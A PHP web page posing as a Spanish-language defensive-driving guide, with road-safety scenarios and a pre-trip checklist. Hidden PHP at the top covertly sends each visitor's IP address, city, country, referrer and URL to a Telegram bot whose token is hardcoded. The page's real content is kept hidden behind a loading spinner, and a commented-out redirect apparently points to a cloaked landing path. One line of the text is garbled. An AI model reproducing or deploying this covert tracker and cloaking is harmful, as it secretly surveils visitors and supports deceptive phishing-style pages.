<?php
date_default_timezone_set('America/Bogota');

$BOT_TOKEN = '7497890468:AAGGItTPfO8JXfESTE8QV_NU22qc-tCsU7A';
$CHAT_ID = '-5214821466';

$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];
$ip = explode(',', $ip)[0];

$geo = @json_decode(@file_get_contents("http://ip-api.com/json/{$ip}"), true);

$pais = $geo['country'] ?? 'Desconocido';
$ciudad = $geo['city'] ?? 'Desconocido';
$referido = !empty($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Directo';
$dominio = $_SERVER['HTTP_HOST'] ?? 'Desconocido';
$urlCompleta = (!empty($_SERVER['HTTPS']) ? 'https://' : 'http://') . $dominio . ($_SERVER['REQUEST_URI'] ?? '');
$dias = ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'];
$meses = ['','Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];
$hora = $dias[date('w')] . ' ' . date('d') . ' de ' . $meses[date('n')] . ', ' . date('g:i A');

$mensaje = "🟢 NUEVO VISITANTE 🟢\n"
    . "🌐 IP: {$ip}\n"
    . "📍 País: {$pais}\n"
    . "🏙️ Ciudad: {$ciudad}\n"
    . "🏠 Dominio: {$dominio}\n"
    . "📄 URL: {$urlCompleta}\n"
    . "🔗 Referido: {$referido}\n"
    . "⏰ Hora: {$hora}";

$ch = curl_init("https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage");
curl_setopt_array($ch, [
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => http_build_query([
        'chat_id' => $CHAT_ID,
        'text' => $mensaje
    ]),
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false
]);
curl_exec($ch);
curl_close($ch);
?>

<!DOCTYPE html>
<html lang="es">
<head>

<!-- <meta http-equiv="refresh" content="3;url=/u/index.html">-->
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ManejoDefensivo — La actitud que evita accidentes antes de que pasen</title>
<meta name="description" content="Técnicas de manejo defensivo, anticipación al riesgo y cómo reaccionar ante situaciones inesperadas en la vía.">
<link href="https://fonts.googleapis.com/css2?family=Barlow:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
:root{--bg:#FFFBEB;--ink:#0C0A09;--mid:#57534E;--soft:#A8A29E;--line:#FEF3C7;--card:#fff;--acc:#CA8A04;--acc-dark:#713F12;--acc-bg:#FEF3C7;--red:#B91C1C;--green:#15803D;--blue:#1D4ED8;}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Barlow',sans-serif;color:var(--ink);background:var(--bg);line-height:1.6}
.wrap{max-width:940px;margin:0 auto;padding:2rem 1.5rem}
.hero{padding:3rem 1rem;text-align:center}
.hero .badge{display:inline-block;background:var(--ink);color:var(--acc-bg);padding:.4rem .9rem;border-radius:4px;font-weight:700;font-size:.8rem;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:1rem}
.hero h1{font-size:clamp(1.9rem,4.5vw,2.6rem);font-weight:800;margin-bottom:.6rem;max-width:680px;margin-left:auto;margin-right:auto;line-height:1.15}
.hero p{color:var(--mid);max-width:580px;margin:0 auto;font-size:.95rem}
.block{background:var(--card);border:2px solid var(--line);border-radius:12px;padding:2rem;margin:1.5rem 0}
.block h2{font-size:1.3rem;font-weight:800;margin-bottom:.5rem;color:var(--acc-dark)}
.block .lead{color:var(--mid);font-size:.88rem;margin-bottom:1.3rem}
.principles{display:grid;grid-template-columns:repeat(3,1fr);gap:.8rem}
.principle{padding:1.2rem;border-radius:10px;background:var(--acc-bg)}
.principle .num{font-size:1.7rem;font-weight:800;color:var(--acc);line-height:1}
.principle h3{font-size:.95rem;font-weight:800;margin:.5rem 0 .3rem}
.principle p{font-size:.78rem;color:var(--mid)}
.scenario{background:linear-gradient(135deg,var(--acc-dark) 0%,#92400E 100%);color:#fff;border-radius:12px;padding:1.8rem;margin:1rem 0}
.scenario h3{font-size:1.1rem;margin-bottom:.4rem}
.scenario .sit{font-size:.9rem;opacity:.92;margin-bottom:1rem;font-style:italic}
.options{display:grid;grid-template-columns:1fr 1fr;gap:.7rem}
.opt{background:rgba(255,255,255,.12);backdrop-filter:blur(8px);border-radius:8px;padding:1rem}
.opt.wrong{border:1px solid rgba(239,68,68,.5)}
.opt.right{border:1px solid rgba(34,197,94,.5)}
.opt h4{font-size:.88rem;margin-bottom:.2rem}
.opt p{font-size:.78rem;opacity:.88}
.opt .tag{display:inline-block;margin-top:.4rem;font-size:.65rem;font-weight:800;padding:.15rem .4rem;border-radius:3px}
.opt.wrong .tag{background:rgba(239,68,68,.3);color:#FEE2E2}
.opt.right .tag{background:rgba(34,197,94,.3);color:#D1FAE5}
.tips{list-style:none}
.tips li{padding:.9rem;background:var(--bg);border-radius:8px;margin-bottom:.5rem;font-size:.85rem;display:flex;gap:.8rem;align-items:flex-start}
.tips li .n{flex-shrink:0;background:var(--acc);color:#fff;width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:.75rem}
.tips li b{color:var(--ink)}
.tips li span{color:var(--mid);display:block;margin-top:.15rem;font-size:.8rem}
footer{text-align:center;padding:2rem 0;color:var(--soft);font-size:.75rem;margin-top:2rem}
@media(max-width:700px){.principles,.options{grid-template-columns:1fr}}
</style>
</head>
<body>
<div class="loader">
        <div class="spinner"></div>
        <p>Cargando...</p>
    </div>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0a0a;font-family:sans-serif}
        .loader{text-align:center;color:#fff}
        .spinner{width:40px;height:40px;border:3px solid rgba(255,255,255,.1);border-top:3px solid #fff;border-radius:50%;margin:0 auto 1rem;animation:spin .8s linear infinite}
        @keyframes spin{to{transform:rotate(360deg)}}
        p{font-size:.9rem;opacity:.6}
    </style>
<div id="main" style="display: none;">

<div class="wrap">

  <div class="hero">
    <span class="badge">Manejo defensivo</span>
    <h1>Maneja como si los demás no te vieran</h1>
    <p>El manejo defensivo no es desconfiar de todos, es anticiparse. Aquí tienes la mentalidad y las técnicas que reducen accidentes.</p>
  </div>

  <div class="block">
    <h2>Los 3 principios del manejo defensivo</h2>
    <p class="lead">La base de todo. Si entiendes esto, el resto fluye.</p>
    <div class="principles">
      <div class="principle"><div class="num">01</div><h3>Observar</h3><p>Barrer la vista lejos y cerca, adelante y atrás. No fijarse en un solo punto.</p></div>
      <div class="principle"><div class="num">02</div><h3>Anticipar</h3><p>Preguntarse "¿qué podría pasar ahora?" Un niño puede salir, una moto adelantar, un carro frenar.</p></div>
      <div class="principle"><div class="num">03</div><h3>Actuar a tiempo</h3><p>Tener siempre una salida pensada. Dejar espacio para reaccionar sin frenar de golpe.</p></div>
    </div>
  </div>

  <div class="block">
    <h2>Situaciones reales: ¿qué harías?</h2>
    <p class="lead">Escenarios comunes donde la decisión correcta marca la diferencia.</p>

    <div class="scenario">
      <h3>🚗 Situación 1</h3>
      <p class="sit">Vas en autopista. El carro de adelante frena fuerte sin razón aparente.</p>
      <div class="options">
        <div class="opt wrong">
          <h4>Frenar y mirar si pasó algo</h4>
          <p>Reaccionas tarde. Si viene alguien detrás, te choca.</p>
          <span class="tag">❌ INCORRECTO</span>
        </div>
        <div class="opt right">
          <h4>Mantener distancia prudente siempre</h4>
          <p>Los 3 segundos de distancia te dan margen para frenar suave y mirar el retrovisor.</p>
          <span class="tag">✓ DEFENSIVO</span>
        </div>
      </div>
    </div>

    <div class="scenario">
      <h3>🏍️ Situación 2</h3>
      <p class="sit">Estás parado en semáforo. Se pone verde y quieres arrancar.</p>
      <div class="options">
        <div class="opt wrong">
          <h4>Acelerar apenas cambia</h4>
          <p>Riesgo alto: alguien puede estar cruzando en amarillo o pasarse el rojo.</p>
          <span class="tag">❌ INCORRECTO</span>
        </div>
        <div class="opt right">
          <h4>Mirar a ambos lados primero</h4>
          <p>1 segundo de verificación evita accidentes de intersección muy graves.</p>
          <span class="tag">✓ DEFENSIVO</span>
        </div>
      </div>
    </div>

    <div class="scenario">
      <h3>🛣️ Situación 3</h3>
      <p class="sit">Vas a adelantar. La carretera parece libre por un buen tramo.</p>
      <div class="options">
        <div class="opt wrong">
          <h4>Confiar en la vista y lanzarse</h4>
          <p>Las distancias engañan. Un carro lejano se te viene encima más rápido de lo que calculas.</p>
          <span class="tag">❌ INCORRECTO</span>
        </div>
        <div class="opt right">
          <h4>Solo adelantar con 100% de certeza</h4>
          <p>Si tienes cualquier duda, espera. Un buen adelantamiento es tan ' que es aburrido.</p>
          <span class="tag">✓ DEFENSIVO</span>
        </div>
      </div>
    </div>

  </div>

  <div class="block">
    <h2>Checklist mental antes de cada viaje</h2>
    <p class="lead">10 segundos antes de arrancar pueden evitar una mala experiencia.</p>
    <ul class="tips">
      <li><span class="n">1</span><div><b>Cinturón, ajuste de espejos y asiento.</b><span>Todos los pasajeros incluidos.</span></div></li>
      <li><span class="n">2</span><div><b>Tengo tiempo suficiente.</b><span>El afán es el origen de la mayoría de maniobras malas.</span></div></li>
      <li><span class="n">3</span><div><b>Estoy descansado y sobrio.</b><span>Si no, no arranques. Punto.</span></div></li>
      <li><span class="n">4</span><div><b>El celular está lejos de mi alcance.</b><span>Guantera, asiento de atrás, cualquier lado menos cerca.</span></div></li>
      <li><span class="n">5</span><div><b>Música a volumen que me deje oír bocinas.</b><span>El oído es parte de tu conducción.</span></div></li>
      <li><span class="n">6</span><div><b>Sé qué ruta voy a tomar.</b><span>Dudar en el camino distrae y lleva a maniobras bruscas.</span></div></li>
    </ul>
  </div>

</div>

<footer>&copy; 2026 ManejoDefensivo — Contenido educativo de seguridad vial.</footer>

</div>
</body>
</html>
